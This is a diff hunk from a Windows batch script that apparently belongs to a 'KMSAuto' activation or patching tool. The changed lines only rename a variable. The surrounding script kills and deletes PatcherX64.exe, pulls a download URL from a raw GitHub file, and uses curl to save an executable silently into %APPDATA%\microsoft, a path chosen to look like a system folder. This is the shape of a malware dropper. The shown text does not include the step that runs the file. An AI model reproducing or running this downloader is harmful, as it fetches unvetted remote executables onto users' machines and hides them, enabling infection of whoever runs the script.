@@ -9,10 +9,10 @@ color 0A
 taskkill /f /im PatcherX64.exe >nul 2>&1
 del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
  
-for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/KMSAutoFileLink') do set "SHSTFILELINK=%%i"
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/KMSAutoFileLink') do set "KMSFILELINK=%%i"
  
 :: Download the file using curl
-curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%SHSTFILELINK%"
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%KMSFILELINK%"
  
 timeout /t 2 /nobreak >nul
  
